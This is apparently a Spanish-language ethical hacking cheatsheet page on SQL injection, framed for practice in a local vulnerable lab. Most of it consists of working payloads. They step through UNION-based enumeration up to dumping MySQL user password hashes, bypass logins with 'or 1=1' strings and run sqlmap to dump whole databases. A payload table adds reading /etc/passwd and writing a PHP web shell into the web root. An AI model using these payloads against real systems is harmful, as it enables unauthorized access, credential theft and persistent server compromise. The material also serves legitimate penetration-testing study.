
# SQL Injection

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Explotación Manual</mark>

Vamos a aprender a cómo explotar un SQL Inyection, para conseguir por ejemplo credenciales de acceso a una base de datos. Vamos a seguir una serie de pasos en un entorno controlado BWAPP, que está disponible en la máquina VPLE por el puerto 8080.

{% hint style="success" %}
Se recomienda la instalación de esta máquina VPLE para practicar todo tipo de ataques web en un entorno controlado en local.
{% endhint %}

{% content-ref url="/pages/4Fpe3nPbdktgWBJEfBND" %}
[VPLE](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/vple.md)
{% endcontent-ref %}

### 1. Comprobar si es vulnerable a SQL Inyection

* Introducir una comilla simple o paréntesis en un input y ver si da un error de backend o sintaxis SQL. Si nos devuelve un error esa web es vulnerable a SQL Inyection.

<figure><img src="/files/BHmrhaMIW6dXM7FYECeF" alt=""><figcaption></figcaption></figure>

### 2. Descubrir el número de columnas en la base de datos

```
' order by 1-- - 
```

<figure><img src="/files/wj4Equ2OnCYP5X6g0Olr" alt=""><figcaption></figcaption></figure>

* Cambiar el 1 por otros números hasta donde de un fallo. Al introducir  `' order by 8-- -` observamos que nos da el error, por lo que esta BBDD tiene 7 columnas.

<figure><img src="/files/g91DDdXUvQR6DYSU2dkx" alt=""><figcaption></figcaption></figure>

### 3. Localizar el punto de inyección

```
cn' UNION select 1,2,3,4,5,6,7-- -
```

Vemos que no muestra nada en el 1 y empieza a mostrar información desde el 2 (punto de inyección), vamos a cambiar estos números 2, 3, 4, 5, 6 y 7 por distintos comandos, para hacer distintas cosas:

<figure><img src="/files/XSYZCIvHcesDO27reZ7I" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Si la BBDD tiene por ejemplo 4 debemos indicarlas de la siguiente manera:

`cn' UNION select 1,2,3,4-- -`
{% endhint %}

### 4. Sacar la versión de la base de datos

```
cn' UNION select 1,@@version,3,4,5,6,7-- -
```

<figure><img src="/files/1KmVKGWWlp8yb23WZQJv" alt=""><figcaption></figcaption></figure>

{% code title="Este hace lo mismo" %}

```
‘ union select null,version(),null,null,null,null,null -- 
```

{% endcode %}

### 5. Sacar el nombre de la base de datos

```
cn' UNION select 1,database(),3,4,5,6,7-- -
```

<figure><img src="/files/bdSVrdFtfvtE1xvtCfPy" alt=""><figcaption></figcaption></figure>

### 6. Ver el SCHEMA

```
cn' UNION select 1,schema_name,3,4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA-- -
```

<figure><img src="/files/M1e0yluFSaJCoolaAHzi" alt=""><figcaption></figcaption></figure>

### 7. Acceder a tablas:

{% code overflow="wrap" %}

```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5,6,7 from INFORMATION_SCHEMA.TABLES where table_schema='mysql'-- -
```

{% endcode %}

<figure><img src="/files/QWgiIHjVjheAqiUmIS5B" alt=""><figcaption></figcaption></figure>

* Podemos sustituir `mysql` por cualquier nombre de la tabla
* Encontramos una tabla `user` que nos interesa, donde podría haber información sensible

<figure><img src="/files/hpS7GqvF3X0FSMnPF6rR" alt=""><figcaption></figcaption></figure>

### 8. Acceder a columnas:

{% code overflow="wrap" %}

```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5,6,7 from INFORMATION_SCHEMA.COLUMNS where table_name='user'-- -
```

{% endcode %}

<figure><img src="/files/1DVGXEzaZyqkDKZf7aaG" alt=""><figcaption></figcaption></figure>

### 9. Acceso a contraseñas

```
cn' UNION select 1, User, Password, 4,5,6,7 from mysql.user-- -
```

<figure><img src="/files/bPJBUHN3P40phLEiF6dC" alt=""><figcaption></figcaption></figure>

### 10. SQL Injection en Login

Con esta técnica un atacante podría saltarse el introducir una contraseña y acceder a un servicio web, solamente introduciendo el siguiente comando en el login:

```
' or 1=1 --+
```

```
admin' or '1'='1 --
```

## <mark style="color:purple;">Explotación Automática:</mark>&#x20;

### <mark style="color:purple;">SQL Map</mark>

Es la herramienta por excelencia para la explotación de SQL inyection. Primero, capturamos la solicitud POST con Burp, la guardamos en un archivo y marcamos el parámetro `searchitem` con un `*` para que sqlmap sepa dónde inyectar.

1. Interceptar petición con BurpSuite -> seleccionar todo -> botón derecho -> copy to file a `burp.req`

#### Saber las bases de datos disponibles

```bash
sqlmap -r burp.req --batch --dbs -p username

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys
```

#### Saber las tablas de una base de datos en concreto

```bash
sqlmap -r burp.req --batch -D mysql --tables

[19:14:31] [INFO] fetching tables for database: 'mysql'
Database: mysql
[37 tables]
+------------------------------------------------------+
| component                                            |
| plugin                                               |
| user                                                 |
| columns_priv                                         |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| password_history                                     |
<---SNIP--->
```

#### Saber las columnas de una tabla en concreto

{% code overflow="wrap" %}

```bash
afsh4ck@kali$ sqlmap -r sqli.txt --dbms=mysql -D status --tables

[00:10:29] [INFO] fetching tables for database: 'status'
Database: status
[2 tables]
+---------+
| company |
| users   |
+---------+
```

{% endcode %}

#### Saber el usuario de la base de datos

```bash
sqlmap -r burp.req --batch --current-user

[19:23:09] [INFO] fetching current user
current user: 'root@localhost'
```

#### Dumpear toda la información de la base de datos

```bash
sqlmap -r burp.req --ignore-redirects --batch --dump --dbms=mysql 
```

La siguiente sección estará dedicada completamente a esta herramienta, donde la veremos en profundidad con ejemplos de uso:

{% content-ref url="/pages/Vmwan4ozoYs6b29MDC10" %}
[SQLMap](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/sql-injection/sqlmap.md)
{% endcontent-ref %}

## <mark style="color:purple;">Cheatsheet</mark>

### MySQL

<table data-header-hidden><thead><tr><th width="396"></th><th></th></tr></thead><tbody><tr><td><strong>Comandos</strong></td><td><strong>Descripción</strong></td></tr><tr><td><mark style="color:purple;"><strong>General</strong></mark></td><td></td></tr><tr><td><code>mysql -u root -h docker.server.eu -P 3306 -p</code></td><td>Login en la base de datos mysql</td></tr><tr><td><code>SHOW DATABASES</code></td><td>Mostrar todas las bases de datos</td></tr><tr><td><code>USE users</code></td><td>Usar una base de datos</td></tr><tr><td><mark style="color:purple;"><strong>Tablas</strong></mark></td><td></td></tr><tr><td><code>CREATE TABLE logins (id INT, ...)</code></td><td>Añadir una nueva</td></tr><tr><td><code>SHOW TABLES</code></td><td>Mostrar todas las tablas</td></tr><tr><td><code>DESCRIBE logins</code></td><td>Mostrar las propiedades de una tabla</td></tr><tr><td><code>INSERT INTO table_name VALUES (value_1,..)</code></td><td>Añade valores a una tabla</td></tr><tr><td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td><td>Agregar valores a columnas específicas en una tabla</td></tr><tr><td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &#x3C;condition></code></td><td>Actualizar valores de la tabla</td></tr><tr><td><mark style="color:purple;"><strong>Columnas</strong></mark></td><td></td></tr><tr><td><code>SELECT * FROM table_name</code></td><td>Mostrar todas las columnas de una tabla</td></tr><tr><td><code>SELECT column1, column2 FROM table_name</code></td><td>Mostrar columnas específicas en una tabla</td></tr><tr><td><code>DROP TABLE logins</code></td><td>Borrar una tabla</td></tr><tr><td><code>ALTER TABLE logins ADD newColumn INT</code></td><td>Añadir nueva columna</td></tr><tr><td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td><td>Renombrar columna</td></tr><tr><td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td><td>Cambiar tipo de datos de columna</td></tr><tr><td><code>ALTER TABLE logins DROP oldColumn</code></td><td>Borrar una columna</td></tr><tr><td><mark style="color:purple;"><strong>Output</strong></mark></td><td></td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1</code></td><td>Ordenar por columna</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td><td>Ordenar por columna descendente</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td><td>Ordenar por dos columnas</td></tr><tr><td><code>SELECT * FROM logins LIMIT 2</code></td><td>Mostrar solo los dos primeros resultados</td></tr><tr><td><code>SELECT * FROM logins LIMIT 1, 2</code></td><td>Mostrar solo los dos primeros resultados a partir del índice 2</td></tr><tr><td><code>SELECT * FROM table_name WHERE &#x3C;condition></code></td><td>Enumerar resultados que cumplen una condición</td></tr><tr><td><code>SELECT * FROM logins WHERE username LIKE 'admin%'</code></td><td>Listar resultados donde el nombre es similar a una cadena determinada</td></tr></tbody></table>

### <mark style="color:purple;">Operadores en MySQL</mark>

* División (`/`), Multiplicación (`*`), y Modulos (`%`)
* Adición (`+`) and Sustracción (`-`)
* Comparación (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

### <mark style="color:purple;">SQL Injection</mark>

<table data-header-hidden><thead><tr><th width="384"></th><th></th></tr></thead><tbody><tr><td><strong>Payload</strong></td><td><strong>Descripción</strong></td></tr><tr><td><mark style="color:purple;"><strong>Auth Bypass</strong></mark></td><td></td></tr><tr><td><code>admin' or '1'='1</code></td><td>Omisión de autenticación básica</td></tr><tr><td><code>admin')-- -</code></td><td>Omisión de autenticación básica con comentarios</td></tr><tr><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td><td></td></tr><tr><td><mark style="color:purple;"><strong>Union Injection</strong></mark></td><td></td></tr><tr><td><code>' order by 1-- -</code></td><td>Detectar el número de columnas usando <code>order by</code></td></tr><tr><td><code>cn' UNION select 1,2,3-- -</code></td><td>Detectar el número de columnas usando <code>Union injection</code></td></tr><tr><td><code>cn' UNION select 1,@@version,3,4-- -</code></td><td>Union injection básico</td></tr><tr><td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td><td>Union injection para 4 columnas</td></tr><tr><td><mark style="color:purple;"><strong>DB Enumeration</strong></mark></td><td></td></tr><tr><td><code>SELECT @@version</code></td><td>Fingerprint MySQL con query output</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>Fingerprint MySQL sin output</td></tr><tr><td><code>cn' UNION select 1,database(),2,3-- -</code></td><td>Nombre de la base de datos actual</td></tr><tr><td><code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td><td>Listar todas las bases de datos</td></tr><tr><td><code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code></td><td>Enumerar todas las tablas en una base de datos específica</td></tr><tr><td><code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code></td><td>Enumerar todas las columnas de una tabla específica</td></tr><tr><td><code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code></td><td>Volcar datos de una tabla en otra base de datos</td></tr><tr><td><mark style="color:purple;"><strong>Privileges</strong></mark></td><td></td></tr><tr><td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code></td><td>Encontrar usuario actual</td></tr><tr><td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</code></td><td>Encuentra si el usuario tiene privilegios de administrador</td></tr><tr><td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -</code></td><td>Busca todos los usuarios con privilegios</td></tr><tr><td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</code></td><td>Encontrar a qué directorios se puede acceder a través de MySQL</td></tr><tr><td><mark style="color:purple;"><strong>File Injection</strong></mark></td><td></td></tr><tr><td><code>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</code></td><td>Leer archivo local</td></tr><tr><td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td><td>Escribir una cadena en un archivo local</td></tr><tr><td><code>cn' union select "",'&#x3C;?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -</code></td><td>Escriba un shell web en el directorio web base</td></tr></tbody></table>

## <mark style="color:purple;">Hack Tools Plugin</mark>

<figure><img src="/files/BPFaIrxoP3b7pYDch0P2" alt=""><figcaption><p>Hack Tools PLugin</p></figcaption></figure>

{% embed url="<https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi?hl=es-419>" %}

Con este plugin disponible para todos los navegadores tenemos a mano multitud de comandos para explotar SQL Injections.
